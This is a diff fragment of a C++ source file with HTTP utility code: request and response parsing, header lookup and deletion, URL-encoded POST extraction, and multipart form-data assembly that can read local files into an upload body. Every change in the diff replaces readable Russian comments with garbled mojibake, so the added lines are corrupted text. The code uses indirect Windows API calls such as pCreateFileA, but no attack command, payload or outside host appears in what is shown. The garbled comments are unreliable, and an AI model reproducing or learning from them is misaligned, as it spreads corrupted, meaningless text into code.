+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR MethodPtr = ScanLN(Line, ' ');
 	PCHAR PathPtr = ScanLN(MethodPtr, '/', true);
 	PCHAR ProtPtr = ScanLN(PathPtr, ' ');
@@ -794,35 +805,35 @@ bool ParseRequestFirstLine(PCHAR Line, PCHAR *Method, PCHAR *Path, PCHAR *ProtVe
 	PCHAR MethodName = GetStrFromPtr(Line, MethodPtr);
 	if (!IsKnownHTTPMethod(MethodName))
 	{
-		// Неизвестный метод запроса
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		STR::Free(MethodName);
 		return false;
     }
 
-	// Получаем метод
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Method != NULL)
 		*Method = MethodName;
 	else
 		STR::Free(MethodName);
 
-	// Получаем путь
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (Path != NULL)
 		*Path = GetStrFromPtr(PathPtr, ProtPtr);
 
-	// Получаем протокол
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (ProtVersion != NULL)
 	{
 		IgnoreSpaces(ProtPtr);
 		*ProtVersion = GetStrFromPtr(ProtPtr, EndL);
     }
 
-	// Возвращаем итину если получены указатели на 3 блока
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ 3 пїЅпїЅпїЅпїЅпїЅ
 	return true;
 }
 
 THTTPMethod GetMethodFromStr(PCHAR Method)
 {
-	// Функция возвращает тип метода по его названию
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	switch (StrIndexOf(Method, false, 3, HTTPMethodGET, HTTPMethodPOST, HTTPMethodHEAD)) 
 	{
 		case 0:
@@ -839,33 +850,33 @@ THTTPMethod GetMethodFromStr(PCHAR Method)
 
 PCHAR HTTPParser::GetHeaderValue(PCHAR Buf, PCHAR Name)
 {
-	// Функция возвращает значение заголовка
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Buf == NULL || Name == NULL)
 		return NULL;
 		
 	DWORD Len = StrCalcLength(Name);
-	PCHAR Line = Buf; // Указатель на начало строки
-	PCHAR EndLN;      // Указатель на конец строки
-	PCHAR ValPTR;     // Указатель на разделитель ':'
+	PCHAR Line = Buf; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	PCHAR EndLN;      // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	PCHAR ValPTR;     // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ':'
 	
-	DWORD LBCount; // Количество символов разделения строк
+	DWORD LBCount; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	
-	// Построчно перебираем буфер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	while (*Line != 0)
 	{
   		IgnoreSpaces(Line);
 		EndLN = GetEndLine(Line);
-		// Ишем позицию разделителя
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		
 		ValPTR = ScanLN(Line, ':', true);
 		if (ValPTR != NULL && StrSame(Line, Name, false, Len)) 
 		{
-			// Нашли совпадение имени
+			// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			IgnoreSpaces(ValPTR);
 			return GetStrFromPtr(ValPTR, EndLN);
 		}
 
-		// Переходим на следующёю позицию
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		LBCount = 1;
 		Line = EndLN;
 		while (*Line != 0 && (*Line == 10 || *Line == 13)) 
@@ -874,8 +885,8 @@ PCHAR HTTPParser::GetHeaderValue(PCHAR Buf, PCHAR Name)
 			LBCount++;
 		}
 
-		// Если встретили 4 и больше разделителя(конец заголовка) то
-		// прерываем цикл
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 4 пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ(пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ) пїЅпїЅ
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		if (LBCount >= 4) break;
 			
 	}
@@ -885,23 +896,23 @@ PCHAR HTTPParser::GetHeaderValue(PCHAR Buf, PCHAR Name)
 //----------------------------------------------------------------------------
 DWORD HTTPParser::DeleteHeader(PCHAR Header, PCHAR HTML, DWORD HTMLSize)
 {
-	// Удалить заголовок из HTML документа. Документ должен содержать
-	// ответ HTTP сервера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅ HTTP пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(Header) || STR::IsEmpty(HTML)) return HTMLSize;
 
-	// Определяем общий размер документа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (HTMLSize == 0)
 		HTMLSize = StrCalcLength(HTML);
 
-	// Определяем позицию конца заголовков ответа сервера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int HeadersSize = STR::Pos(HTML, LineBreak2, HTMLSize);
 	if (HeadersSize <= 0) return HTMLSize;
 
-	// Ищем позицию нужного заголовка
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int Start = STR::Pos(HTML, Header,  HeadersSize);
-	if (Start < 0) return HTMLSize; // Заголовка нет.
+	if (Start < 0) return HTMLSize; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
 
-	// Определяем конец строки заголовка
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Tmp = HTML + Start;
 	int End = Start;
 	while (*Tmp != 10 && *Tmp != 13 && (DWORD(Tmp - HTML) <  HTMLSize))
@@ -909,13 +920,13 @@ DWORD HTTPParser::DeleteHeader(PCHAR Header, PCHAR HTML, DWORD HTMLSize)
 		Tmp++;
         End++;
 	}
-	End += 2; // Пропускаем \r\n
+	End += 2; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ \r\n
 
-	// Удаляем лишний код
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	Tmp = HTML + End;
 	STR::Copy(Tmp, HTML + Start, 0, HTMLSize - End);
 
-	// Ставим заверщающий ноль
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	HTMLSize -= End - Start;
 
 	Tmp = HTML + HTMLSize;
@@ -927,10 +938,10 @@ DWORD HTTPParser::DeleteHeader(PCHAR Header, PCHAR HTML, DWORD HTMLSize)
 
 PCHAR GetURLEncodedPostData(PCHAR Buf)
 {
-	// Получить URL кодированные пост данные.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ URL пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-	// Определяем позицию двойного разделителя строк и копируем данные
-	// до следующей строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	int Pos = STR::Pos(Buf, LineBreak2);
 
@@ -947,11 +958,11 @@ PCHAR GetURLEncodedPostData(PCHAR Buf)
 
 //***************************************************************************
 //
-//   Методы для работы с пост данными формата multy part form data
+//   пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ multy part form data
 //
 //***************************************************************************
 
-// Методы чтения данных MultiPartData
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ MultiPartData
 namespace MPDReader
 {
 
@@ -965,16 +976,16 @@ namespace MPDReader
 
 	void MakeItemHeader(PMultiPartData Data, PMultiPartItem  Item)
 	{
-		// Собрать заголовок элемента
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 		PCHAR Prefix = NULL;
-		// Перед первым элементом вставляем Boundary
+		// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Boundary
 		if (List::GetItem(Data->Items, 0) == Item)
 			Prefix = STR::New(3, BoundaryDelimeter, Data->Boundary, LineBreak);
 
 		if (Item->FileName == NULL)
 		{
-			// Обычный элемент
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			Item->Header = STR::New(5, Prefix, ContentDispositionName, Item->Name, "\"", LineBreak2);
             STR::Free(Prefix);
 			return;
@@ -985,7 +996,7 @@ namespace MPDReader
 		if (CT == NULL)
 			CT = DefaultContentType;
 
-		// Собираем заголовок элемента файла
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		Item->Header = STR::New(13,
 			Prefix,
 			ContentDispositionName, Item->Name, "\"",
@@ -996,7 +1007,7 @@ namespace MPDReader
 		STR::Free(Prefix);
     }
 
-	// Копируем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	void CopyData(LPVOID Data, DWORD DataSize, LPBYTE &Buffer, DWORD &BufSize)
 	{
 		m_memcpy(Buffer, Data, DataSize);
@@ -1008,7 +1019,7 @@ namespace MPDReader
 
 	DWORD ReadItem(PMultiPartData Data, PMultiPartItem  Item, LPBYTE Buffer, DWORD Size, bool IsLastItem)
 	{
-		// Читать данные элемента
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Item == NULL)
 			return 0;
 
@@ -1017,27 +1028,27 @@ namespace MPDReader
 
 		DWORD Result = 0;
 
-		// Раситываем размер данных элемента
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Buffer == NULL)
 		{
-			Result = STR::Length(Item->Header); // Размер заголовка
-			Result += 2; // Пустая строка после данных
-			Result += Item->Size; // Данные
+			Result = STR::Length(Item->Header); // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			Result += 2; // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+			Result += Item->Size; // пїЅпїЅпїЅпїЅпїЅпїЅ
 			Result += 2 + STR::Length(Data->Boundary); // --Boundary
 			if (IsLastItem)
-				Result += 2; // Символы -- после Boundary
-			Result += 2; // Перевод строки после данных
+				Result += 2; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ -- пїЅпїЅпїЅпїЅпїЅ Boundary
+			Result += 2; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			return Result;
 		}
 
-		// Читаем данные элемента
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
         DWORD Max;
 
 		if (Item->ReadState == mprsUnknown)
 			Item->ReadState = mprsHeader;
 
-		// Читаем заголовок
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Item->ReadState == mprsHeader)
 		{
 			Max = STR::Length(Item->Header) - Item->ReadedSize;
@@ -1055,7 +1066,7 @@ namespace MPDReader
 				return Result;
 		}
 
-		// Читаем данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Item->ReadState == mprsData)
 		{
 			bool IsFile = Item->FileHandle != NULL && Item->Data == NULL;
@@ -1069,7 +1080,7 @@ namespace MPDReader
 				CopyData((LPBYTE)Item->Data + Item->ReadedSize, Max, Buffer, Size);
 			else
 			{
-				// Читаем данные из файла
+				// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 				pReadFile(Item->FileHandle, Buffer, Max, &Max, NULL);
 				Buffer += Max;
 				Size -= Max;
@@ -1086,10 +1097,10 @@ namespace MPDReader
 				return Result;
         }
 
-		// Читаем Boundary
+		// пїЅпїЅпїЅпїЅпїЅпїЅ Boundary
 		if (Item->ReadState == mprsBoundary)
 		{
-			// Собираем идентификатор границы
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 			if (Item->Boundary == NULL)
 			{
@@ -1100,7 +1111,7 @@ namespace MPDReader
 				Item->Boundary = STR::New(5, LineBreak, BoundaryDelimeter, Data->Boundary, BNDEnd, LineBreak);
             }
 
-			// Читаем данные границы
+			// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			Max = STR::Length(Item->Boundary) - Item->ReadedSize;
 			if (Max > Size)
 				Max = Size;
@@ -1129,13 +1140,13 @@ namespace MPDReader
 	//-----------------------------------------------------------------------
 	DWORD TotalSize(PMultiPartData Data)
 	{
-		// Функция возвращает общий объём данных
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Data == NULL)
 			return 0;
 
 		DWORD Size = 0;
 		DWORD Count = List::Count(Data->Items);
-		// Определяем размер блоков
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		for (DWORD i = 0; i < Count; i++)
         {
 			PMultiPartItem  Item = (PMultiPartItem)List::GetItem(Data->Items, i);
@@ -1166,7 +1177,7 @@ void FreeMultipartItem(LPVOID Item)
 
 PMultiPartData MultiPartData::Create()
 {
-	// Создать набор данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	const static PCHAR Boundary = "---------";
 	const BYTE MaxBnd = 16;
 	PMultiPartData Data = CreateStruct(TMultiPartData);
@@ -1185,7 +1196,7 @@ PMultiPartData MultiPartData::Create()
 
 void MultiPartData::Free(PMultiPartData Data)
 {
-	// Уничтожить набор данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Data == NULL)
 		return;
 
@@ -1195,7 +1206,7 @@ void MultiPartData::Free(PMultiPartData Data)
 }
 
 
-// Добавить бинарные данные
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 PMultiPartItem MultiPartData::AddBlobField(PMultiPartData Data, PCHAR Name, LPBYTE Value, DWORD ValueSize)
 {
 	if (Data == NULL || STR::IsEmpty(Name))
@@ -1219,19 +1230,19 @@ PMultiPartItem MultiPartData::AddBlobField(PMultiPartData Data, PCHAR Name, LPBY
 
 PMultiPartItem MultiPartData::AddStringField(PMultiPartData Data, PCHAR Name, PCHAR Value)
 {
-    // Добавить строковое значение в список
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	return AddBlobField(Data, Name, (LPBYTE)Value, StrCalcLength(Value));
 }
 
-// Добавить файл
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 PMultiPartItem  MultiPartData::AddFileField(PMultiPartData Data, PCHAR Name,
 										PCHAR FileName, PCHAR ContentType)
 {
-	// Добавить файловый элемент
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Data == NULL || STR::IsEmpty(Name) || STR::IsEmpty(FileName))
 		return NULL;
 
-	// Получаем размер файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	HANDLE H = (HANDLE)pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 
 	if (H == INVALID_HANDLE_VALUE)
@@ -1241,7 +1252,7 @@ PMultiPartItem  MultiPartData::AddFileField(PMultiPartData Data, PCHAR Name,
     DWORD Size = (DWORD)pGetFileSize(H, &HS);
 
 
-	// Добавляем элемент
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PMultiPartItem Item = AddBlobField(Data, Name, NULL, Size);
 	if (Item == NULL)
 	{
@@ -1256,7 +1267,7 @@ PMultiPartItem  MultiPartData::AddFileField(PMultiPartData Data, PCHAR Name,
 }
 
 
-// Добавить двоичные данные как файл
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 PMultiPartItem MultiPartData::AddBlobAsFile(PMultiPartData Data, PCHAR Name, PCHAR FileName,
 							 PCHAR ContentType, LPBYTE Value, DWORD ValueSize)
 {
@@ -1278,10 +1289,10 @@ PMultiPartItem MultiPartData::AddBlobAsFile(PMultiPartData Data, PCHAR Name, PCH
 
 DWORD MultiPartData::Read(PMultiPartData Data, LPBYTE Buffer, DWORD BufferSize)
 {
-	// Функция читаем следующий блок данных.
-	// Результат - количество прочитанных байт
-	// Примечание - если на вход передать нулевой буфер, то
-	// функция вернёт общий размер пост данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Buffer == NULL || BufferSize == 0)
 		return MPDReader::TotalSize(Data);
 
@@ -1297,12 +1308,12 @@ DWORD MultiPartData::Read(PMultiPartData Data, LPBYTE Buffer, DWORD BufferSize)
 			continue;
 		}
 
-		// Читаем элемент
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		bool LastItem = Data->ReadIndex == Count - 1;
 		DWORD Readed = MPDReader::ReadItem(Data, Item, Buffer, BufferSize, LastItem);
 		if (Readed == 0) break;
 
-		// Меняем размер буфера и указателя на буфер
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		Result += Readed;
 		BufferSize -= Readed;
 		Buffer += Readed;
@@ -1316,14 +1327,14 @@ DWORD MultiPartData::Read(PMultiPartData Data, LPBYTE Buffer, DWORD BufferSize)
 
 LPBYTE MultiPartData::BuildToBuf(PMultiPartData Data, DWORD &ResultSize)
 {
-	// Записать данные в блок памяти
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
-	// Определяем размер памяти
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	ResultSize = Read(Data, NULL, 0);
 	if (ResultSize == 0)
 		return NULL;
 
-	// Читаем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	LPBYTE Buf = (LPBYTE)MemAlloc(ResultSize + 1);
 	if (Buf == NULL)
 	{
@@ -1339,14 +1350,14 @@ LPBYTE MultiPartData::BuildToBuf(PMultiPartData Data, DWORD &ResultSize)
 //---------------------------------------------------------------------------
 PHTTPResponse HTTPResponse::Create()
 {
-	// Создать структуру отыета
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	return CreateStruct(THTTPResponse);
 }
 //---------------------------------------------------------------------------
 
 void HTTPResponse::Clear(PHTTPResponse Response)
 {
-	// Функция очищает структуру HTTP ответа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTTP пїЅпїЅпїЅпїЅпїЅпїЅ
 	STR::Free2(Response->Protocol);
 	STR::Free2(Response->ContentType);
 	STR::Free2(Response->ResponseLine);
@@ -1400,7 +1411,7 @@ void AddResponseValue(PHTTPResponse Response, PCHAR Name, PCHAR Value)
 
 bool HTTPResponse::Parse(PCHAR Buf, PHTTPResponse Response)
 {
-	// Парсим ответ HTTP сервера
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ HTTP пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Buf == NULL || Response == NULL)
 		return false;
 	bool Result  = false;
@@ -1418,7 +1429,7 @@ bool HTTPResponse::Parse(PCHAR Buf, PHTTPResponse Response)
     PCHAR Ptr;
 	if (Count > 0)
 	{
-		// Разбираем строку ответа
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (HTTPParser::ParseResponseLine(Strings::GetItem(S, 0, false), Response->Protocol, Response->Code, Response->ResponseLine))
 		{
 			Result = true;
@@ -1444,7 +1455,7 @@ bool HTTPResponse::Parse(PCHAR Buf, PHTTPResponse Response)
 
 void HTTPResponse::Free(PHTTPResponse Response)
 {
-	// Создать структуру отыета
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Response == NULL)
 		return;
 	HTTPResponse::Clear(Response);
@@ -1452,15 +1463,15 @@ void HTTPResponse::Free(PHTTPResponse Response)
 }
 
 //*****************************************************************************
-//  Chunks - Методы для работы с передачей данных частями
